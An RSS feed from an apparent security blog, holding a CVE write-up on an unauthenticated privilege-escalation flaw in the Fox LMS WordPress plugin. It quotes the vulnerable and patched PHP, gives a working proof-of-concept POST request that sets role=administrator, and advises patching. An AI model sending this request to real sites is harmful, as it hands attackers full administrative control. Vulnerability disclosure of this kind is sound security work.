<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bui Van Y</title>
    <link>http://localhost:1313/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.153.2 &amp; FixIt v0.4.0-alpha.3-20251225101113-8ffb9a95</generator>
    <language>en</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Thu, 08 Jan 2026 14:55:45 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-2563 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2026-01-08-cve-2025-14156/</link>
      <pubDate>Thu, 08 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2026-01-08-cve-2025-14156/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-08-cve-2025-14156/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin &lt;strong&gt;The Fox LMS – WordPress LMS Plugin&lt;/strong&gt; for &lt;strong&gt;WordPress&lt;/strong&gt; contains a &lt;strong&gt;privilege escalation&lt;/strong&gt; vulnerability in all &lt;strong&gt;versions up to and including 1.0.5.1&lt;/strong&gt;. The root cause is that the plugin &lt;strong&gt;does not properly validate the “role” parameter&lt;/strong&gt; when &lt;strong&gt;creating new users&lt;/strong&gt; via the &lt;strong&gt;REST API endpoint &lt;code&gt;/fox-lms/v1/payments/create-order&lt;/code&gt;&lt;/strong&gt;. This allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to &lt;strong&gt;create new user accounts with arbitrary roles, including administrator&lt;/strong&gt;, which can lead to &lt;strong&gt;full site compromise&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2563&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2563&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 1.0.4.7-1.0.5.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.0.5.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Fox LMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Fox LMS&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.0.5.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.0.5.3&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition note open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Although the public information states that the vulnerability was fixed in version &lt;strong&gt;&lt;code&gt;1.0.5.2&lt;/code&gt;&lt;/strong&gt;, in practice the fix was only fully applied starting from version &lt;strong&gt;&lt;code&gt;1.0.5.3&lt;/code&gt;&lt;/strong&gt;.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a REST API as follows:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    self::getNamespace(), // fox-lms/v1&#xA;    $this-&amp;gt;getRoute(&amp;#39;create-order&amp;#39;), // payments/create-order&#xA;    [&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE, // POST&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; [$this, &amp;#39;createOrder&amp;#39;],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; &amp;#39;__return_true&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this configuration, the endpoint is exposed at:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/fox-lms/v1/payments/create-order&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a POST request is sent to this endpoint, WordPress automatically invokes the &lt;code&gt;createOrder()&lt;/code&gt; function. Because &lt;code&gt;&#39;permission_callback&#39; =&amp;gt; &#39;__return_true&#39;&lt;/code&gt; is configured, the endpoint does not enforce any permission checks. This means that &lt;strong&gt;any user, including unauthenticated users, can access and execute this API without any authorization restrictions&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function createOrder(WP_REST_Request $request): WP_REST_Response&#xA;{&#xA;    $defaults = [&#xA;        &amp;#39;courseId&amp;#39;   =&amp;gt; 0,&#xA;        &amp;#39;role&amp;#39;       =&amp;gt; &amp;#39;subscriber&amp;#39;,&#xA;        ...&#xA;    ];&#xA;    ...&#xA;    $params = wp_parse_args($request-&amp;gt;get_params(), $defaults);&#xA;&#xA;    if (absint($params[&amp;#39;courseId&amp;#39;]) &amp;lt;= 0) {&#xA;        return (new Response() )-&amp;gt;respond(&#xA;            [&#xA;                &amp;#39;message&amp;#39; =&amp;gt; Fox_Lms_Checkout_Public::getPaymentError(&#xA;                    $this-&amp;gt;errorTitle,&#xA;                    __(&amp;#39;Course not found&amp;#39;, &amp;#39;fox-lms&amp;#39;)&#xA;                ),&#xA;            ],&#xA;            404&#xA;        );&#xA;    }&#xA;    $username = sanitize_user($params[&amp;#39;username&amp;#39;]);&#xA;    $email    = sanitize_email($params[&amp;#39;email&amp;#39;]);&#xA;    ...&#xA;    try {&#xA;        $currency = Payment::instance()-&amp;gt;getCurrencyCode();&#xA;&#xA;        $course         = get_post($params[&amp;#39;courseId&amp;#39;]);&#xA;        $course_info = Fox_Lms_Data::get_course_by_post_id( $params[&amp;#39;courseId&amp;#39;]);&#xA;            &#xA;        $settings = Fox_Lms_Data::get_course_validated_data_from_array( $course_info,[]);&#xA;        $price = Fox_Lms_Data::fox_lms_get_course_price($settings);&#xA;    &#xA;        $courseSettings = [&#xA;            &amp;#39;priceType&amp;#39;  =&amp;gt; ! empty($settings[&amp;#39;fox_lms_payment_type&amp;#39;]) ? $settings[&amp;#39;fox_lms_payment_type&amp;#39;] : &amp;#39;free&amp;#39;,&#xA;            &amp;#39;price&amp;#39; =&amp;gt; $price,&#xA;        ];&#xA;        // $courseSettings = SettingsManager::get($course-&amp;gt;ID);&#xA;        $price          = floatval($courseSettings[&amp;#39;price&amp;#39;]);&#xA;        ...&#xA;&#xA;        // If price is zero or less, treat as free order: create completed order and enroll user immediately.&#xA;        if ($price &amp;lt;= 0) {&#xA;            global $wpdb;&#xA;&#xA;            $userId = 0;&#xA;            if (is_user_logged_in()) {&#xA;                $userId = get_current_user_id();&#xA;            } else {&#xA;                $userData = array(&#xA;                    &amp;#39;first_name&amp;#39; =&amp;gt; sanitize_text_field($params[&amp;#39;first_name&amp;#39;]),&#xA;                    &amp;#39;last_name&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;last_name&amp;#39;]),&#xA;                    &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user($params[&amp;#39;username&amp;#39;]),&#xA;                    &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email($params[&amp;#39;email&amp;#39;]),&#xA;                    &amp;#39;user_pass&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;password&amp;#39;]),&#xA;                    &amp;#39;role&amp;#39;       =&amp;gt; sanitize_text_field($params[&amp;#39;role&amp;#39;]),&#xA;                );&#xA;&#xA;                $userId = wp_insert_user($userData);&#xA;                ...&#xA;            }&#xA;        }&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;createOrder()&lt;/code&gt; function receives request data and applies default values, where &lt;strong&gt;&lt;code&gt;role&lt;/code&gt; defaults to &lt;code&gt;subscriber&lt;/code&gt;&lt;/strong&gt;. However, all parameters supplied by the client are merged directly into &lt;code&gt;$params&lt;/code&gt; via &lt;code&gt;wp_parse_args()&lt;/code&gt; &lt;strong&gt;without any validation or restriction on valid values for &lt;code&gt;role&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;When the course price is &lt;strong&gt;zero or free&lt;/strong&gt;, the system automatically creates a new user account if the requester is not logged in. User data is taken directly from the request, including:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;role&amp;#39; =&amp;gt; sanitize_text_field($params[&amp;#39;role&amp;#39;]),&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means an attacker only needs to send a POST request to &lt;code&gt;/wp-json/fox-lms/v1/payments/create-order&lt;/code&gt; and supply an arbitrary value for &lt;code&gt;role&lt;/code&gt; (for example, &lt;code&gt;administrator&lt;/code&gt;). Since the endpoint &lt;strong&gt;does not enforce access control&lt;/strong&gt; and the function &lt;strong&gt;does not validate the role value&lt;/strong&gt;, the new account will be created with the specified privileges.&lt;/p&gt;&#xA;&lt;p&gt;As a result, an unauthenticated attacker can &lt;strong&gt;create an account with administrator privileges&lt;/strong&gt;, leading to &lt;strong&gt;privilege escalation and complete site compromise&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The patch in &lt;strong&gt;&lt;code&gt;v1.0.5.3&lt;/code&gt;&lt;/strong&gt; mitigates this issue by &lt;strong&gt;hardcoding the &lt;code&gt;role&lt;/code&gt; value to &lt;code&gt;subscriber&lt;/code&gt;&lt;/strong&gt; when creating new user accounts, instead of accepting it from user input. This prevents attackers from injecting arbitrary roles to escalate privileges.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$userData = array(&#xA;    &amp;#39;first_name&amp;#39; =&amp;gt; sanitize_text_field($params[&amp;#39;first_name&amp;#39;]),&#xA;    &amp;#39;last_name&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;last_name&amp;#39;]),&#xA;    &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user($params[&amp;#39;username&amp;#39;]),&#xA;    &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email($params[&amp;#39;email&amp;#39;]),&#xA;    &amp;#39;user_pass&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;password&amp;#39;]),&#xA;    &amp;#39;role&amp;#39;       =&amp;gt; &amp;#39;subscriber&amp;#39;,&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-json/fox-lms/v1/payments/create-order&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Endpoint is publicly accessible (permission_callback = __return_true)&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;createOrder() receives request parameters&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_parse_args() merges user input into params (role is not validated)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Attacker sets role=administrator in request&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Course price is free (price &amp;lt;= 0)&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;User is not logged in → system creates new user&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;wp_insert_user() is called with attacker-controlled role&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;New user account is created with Administrator role&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker logs in with newly created account&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Full administrative privileges obtained&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Send a request to create a user:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/fox-lms/v1/payments/create-order HTTP/1.1&#xA;Host: localhost&#xA;&#xA;role=administrator&amp;amp;first_name=hacker&amp;amp;last_name=hacker&amp;amp;username=hacker&amp;amp;email=hacker@gmail.com&amp;amp;courseId=course_id&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-08-cve-2025-14156/result.png&#34; title=&#34;Successfully created a user with role=administrator&#34; data-thumbnail=&#34;/posts/2026-01-08-cve-2025-14156/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Successfully created a user with role=administrator&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-08-cve-2025-14156/result.png&#39; alt=&#34;Result&#34; height=&#34;530&#34; width=&#34;1555&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Successfully created a user with role=administrator&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Log in with the newly created user.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-2563&lt;/strong&gt; vulnerability stems from &lt;strong&gt;a publicly exposed REST API without proper access control&lt;/strong&gt; combined with &lt;strong&gt;a lack of validation for the &lt;code&gt;role&lt;/code&gt; parameter&lt;/strong&gt;, allowing unauthenticated attackers to create accounts with arbitrary privileges, including &lt;strong&gt;Administrator&lt;/strong&gt;. Although the disclosure states that the issue was fixed in &lt;code&gt;1.0.5.2&lt;/code&gt;, the fix was only fully effective starting from &lt;strong&gt;&lt;code&gt;1.0.5.3&lt;/code&gt;&lt;/strong&gt;, where the role was hardcoded to &lt;code&gt;subscriber&lt;/code&gt;. Users should update the plugin immediately and review existing user accounts for potential abuse.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Do not expose sensitive APIs without proper access control.&lt;/li&gt;&#xA;&lt;li&gt;Do not trust client-supplied data, especially privilege-related parameters.&lt;/li&gt;&#xA;&lt;li&gt;Always validate and whitelist input values.&lt;/li&gt;&#xA;&lt;li&gt;Verify actual fixes instead of relying solely on release notes.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/fox-lms/vulnerability/wordpress-fox-lms-plugin-1-0-4-7-1-0-5-1-unauthenticated-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Fox LMS Plugin 1.0.4.7-1.0.5.1 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2563 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2026-01-07-cve-2025-2563/</link>
      <pubDate>Wed, 07 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2026-01-07-cve-2025-2563/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
